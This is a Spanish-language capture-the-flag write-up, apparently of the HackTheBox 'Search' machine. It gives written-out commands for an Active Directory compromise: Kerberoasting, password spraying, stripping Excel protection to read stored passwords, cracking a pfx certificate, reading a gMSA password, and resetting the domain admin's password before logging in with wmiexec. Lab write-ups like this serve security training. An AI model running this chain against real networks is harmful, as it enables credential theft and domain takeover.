--------
- Tags: #bloodhound #rpc #ldap #kerberoasting #crackmapexec #smb #pfx #ReadGMSAPassword #GenericAll-Privilege #wmiexec #windows #password-crack #scriptblocks 
----------
## Técnicas utilizadas
- Information Leakage - Password in picture (wtf?)  
- RPC Enumeration (rpcclient)  
- Ldap Enumeration (ldapdomaindump)  
- Bloodhound Enumeration  
- Kerberoasting Attack (GetUserSPNs.py)  
- SMB Password Spray Attack (Crackmapexec)  
- Unprotecting password-protected Excel (Remove Protection)  
- Playing with pfx certificates  
- Gaining access to Windows PowerShell Web Access  
- Abusing ReadGMSAPassword privilege  
- Abusing GenericAll privilege (Resetting a user's password)  
- Gaining access with wmiexec
## Procedimiento

![[Pasted image 20230616125734.png]]

--------
#### Reconocimiento

El escaneo con **nmap** nos da como resultado los siguientes puertos abiertos:
![[Pasted image 20230616192420.png]]

Si lanzamos un **whatweb** para descubrir las tecnologías que corren por detrás podemos ver lo siguiente:

![[Pasted image 20230616192444.png]]

Podemos aplicar un reconocimiento básico con **crackmapexec** para el servicio de **smb** y ver el nombre de dominio así como el nombre de la maquina:

![[Pasted image 20230616192710.png]]

Como vemos el puerto **53** de **domain**, podemos intentar efectuar un ataque de transferencia de zona(AXFR) con la herramienta **dig** de la siguiente forma:

	 ~sexcott> dig @<ip> search.htb AXRF

-------------
#### Information Leakage - Password in picture (wtf?)  

En la pagina principal podemos ver algunas cosas, entre ellas un slide de imágenes, una de ellas resulta un poco peculiar ya que contienen algunos textos, si la abrimos en una ventana aparte, podemos ver una contraseña:

-----------
#### RPC Enumeration (rpcclient)  

Podemos intentar un ataque de fuerza bruta con el posible username *hope sharp* y la respectiva contraseña *IsolationIsKey?*  con crackmapexec de la siguiente forma:

	~sexcott> crackmapexec smb -u user.txt -p <password>

Ahora que tenemos credenciales validas podemos intentar enumerar el sistema con **rpcclient** de la siguiente manera:

	~sexcott> rpcclient -U "usuario%password" ip

Para enumerar los usuarios validos a nivel de dominio podemos usar:

	rcpclient $> enumdomusers

Podemos jugar con expresión regular para quedarnos únicamente con los usuarios y eliminar toda la basura:

	grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sort -u > users.txt


Podemos intentar efectuar un **ASLPROAST ATTACK** ya que tenemos un listado potencial de usuarios:

	~sexcott> GetNPUsers.py search.htb/ -no-pass -userfile users.txt

pero ningún usuario parece tener el **UF_DONT_PREAUTH** activado.

------------
####  Ldap Enumeration (ldapdomaindump)  

Podemos intentar utilizar **ldapdomaindump** para dumpear algunas cosas del servidor y ver las cosas mucho mas claras desde un formato comodo. La forma de hacerlo es la siguiente:

	~sexcott> ldapdomaindump -u 'search.htb\hope.sharp' -p 'password' <ip>

Una vez con los archivos en nuestro equipo, podemos montarnos un servidor en **PHP** y mirar los archivos.

#### Bloodhound Enumeration 

Tiramos de la herramienta **bloodhound.py** para dumpear los respectivos archivos que usaremos posteriormente en el *GUI* de **BloodHound**. Podemos ejecutar la siguiente sentencia para hacerlo:

	~sexcott> python3 bloodhound.py -u 'usuario' -p 'password' -ns <IP> -d <domain-name> -c ALL

Este comando nos va a generar archivos *.json* que tenemos que subir posteriormente al **BloodHound**

#### Kerberoasting Attack (GetUserSPNs.py)  

A través de **bloodhound** podemos observar que existe un usuario kerberoasteable y como contamos con credenciales validas, podemos intentar de nuevo el kerberoasting attack:

	~sexcott> GetUserSPNs.py search.htb/hope.sharp

Y nos pedirá la contraseña, se la colocamos y nos mostrara el usuario kerberoasteable. Para solicitar el **Ticker Garanting Service** podemos hacerlo de la siguiente forma:

	~sexcott> GetUserSPNs.py search/hope.sharp -request

Esto nos dará un hash que podremos crackear de manera offline con algún diccionario. Antes de intentar crackearlo, tenemos que tener en cuenta de nuestra hora en la computadora tiene que ser la misma que la maquina victima. Eso lo podemos hacer fácilmente con **ntpdate**:

	~sexcott> ntpdate <ip>

--------------
#### SMB Password Spray Attack (Crackmapexec)  

Podemos verificar el usuario y la contraseña crackeada para confirmar que son validas a nivel de sistema.
También podemos intentar lanzar un ataque de fuerza bruta utilizando la contraseña encontrada contra la lista de usuarios creada anteriormente.

	~sexcott> crackmapexec smb <ip> -u users.txt -p 'password' --continue-on-success

-----------
#### Unprotecting password-protected Excel (Remove Protection) 

Es importante que en el **BloodHound** vayamos indicando los usuarios que vamos *pwneando* ya que este nos dará una ruta para escalar privilegios.
Una vez que tengamos varias contraseñas validas, podemos intentar atentar contra el **smb**. Intentamos con cada uno de los usuarios **pwneados** y vemos los respectivos recursos compartidos a nivel de red a los que tenemos permiso de leer y escribir.

Como vemos un recurso con nombre de *CertEnroll*, podemos intentar fuzzear en la pagina principal por archivos de **IIS**. Encontramos una ruta que hace alución al mismo nombre del recurso compartido, pero al intentar acceder a el nos pide contraseña.

Enumerando el **smb** nos encontramos con un *excel*, lo descargamos e intentamos abrirlo desde nuestro equipo.
Si lo abrimos, podemos ver que hay data oculta, la cual no se nos permite ver. Por otro lado, si intentamos hacerlo un *.unzip* al archivo, nos descomprime data porque al fin de cuentas el *.xls* es un comprimido.
Si vemos las hojas de estilos, la primera no nos proporciona lo que queremos, sin embargo, la segunda si tiene la data que necesitamos. Procederemos a eliminar toda la etiqueta de *sheetProtection algorithmName* y lo volvemos a comprimir de la siguiente forma:

	~sexcott> zip document.xlsx -r .

y ahora si podemos ver las contraseñas. Copiamos los usuarios y sus respectivas contraseñas a un archivo por separado y probamos a validarlas de nuevo con **crackmapexec**

	~sexcott> crackmapexec smb <ip> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

---------
#### Playing with pfx certificates

Con las nuevas contraseñas, podemos intentar conectarnos a **smb** con **crackmapexec** para listar los recursos a los cuales tenemos acceso ahora. Dentro de sus recursos compartidos, podemos encontrar un archivo con extensión *.pfx*, lo descargamos en nuestra maquina. Estos certificados los podemos incorporar a nuestros navegadores, pero, muchas veces estos piden una contraseña. Si estos piden contraseña, podemos generar un hash con **pfx2john** para romperlo posteriormente con jonh.

Ahora que tenemos las contraseñas de los certificados, podemos intentar importarlas al navegador web y proporcionando las respectivas contraseñas. Ahora si intentamos entrar a la ruta */staff/* nos dejara entrar sin problema.

-------
#### Gaining access to Windows PowerShell Web Access

Una vez dentro del nuevo directorio web, se nos proporciona un **form**, que si intentamos rellenarlo con la información de *Sierra.Frye*, su contraseña y en el campo de computer name ponemos el nombre de la maquina *research* 

------------
#### Abusing ReadGMSAPassword privilege

Una vez en la consola, ahora si podemos apoyarnos del **BloodHound** para buscar rutas potenciales para escalar privilegios. Vemos que como pertenecemos a nuestro grupo, podemos aplicar **ReadGMSAPassword** sobre un usuario. Como no tenemos manera de subir la herramienta que nos recomienda **BloodHound** podemos intentar explotarlo de manera manual, lo haríamos de la siguiente manera:

1. Verificamos que podemos leer la propiedad **msDS-ManagedPassword**: 
`Get-ADServiceAccount -Idetity '<victim-user>' -Properties 'msDS-ManagedPassword'`

2. Guardamos la query anterior en una variable:
`$gmsa = Get-ADServiceAccount -Idetity '<victim-user>' -Properties 'msDS-ManagedPassword'`

3. Continuamos con:
`$mp = $gmsa, 'msDS-ManagedPassword'`

4. Y para finalmente visualizarla:
`ConvertFrom-ADManagedPasswordBlob $mp`

5. Almacenamos el campo de **SecureCurrentPassword**
`$secpw = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword`

6. Creamos una credencial
`$cred = New-Object System.Management.Automation.PScredential '<victim-user', $secpw`

7. Ejecutar comandos:
`Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { comando }`

-------------
#### Abusing GenericAll privilege (Resetting a user's password)  

Una vez podamos ejecutar comandos como el usuario capaz de cambiarle la contraseña al *domain-admin(tristan)* podemos proceder a cambiarle su contraseña de la siguiente manera:

	Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { net user tristan.davies sexcott123$! }

Si todo ha salido bien, hemos sido capaz de cambiarle la contraseña al usuario *tristan*.

-----------
#### Gaining access with wmiexec

Dado que, si comprobamos con **crackmapexec** las credenciales del usuario al cual le acabamos de cambiar la contraseña y este nos dice que son correctas y además, el resultado esta acompañado con un **Pwn3d!** a un lado, podriamos conectarnos con **wmiexec.py** a la maquina victima como *domain admin*.

	~sexcott> wmiexec.py search.htb/tristan.davies@<ip>

Y estamos dentro de la maquina victima como *domain admin*











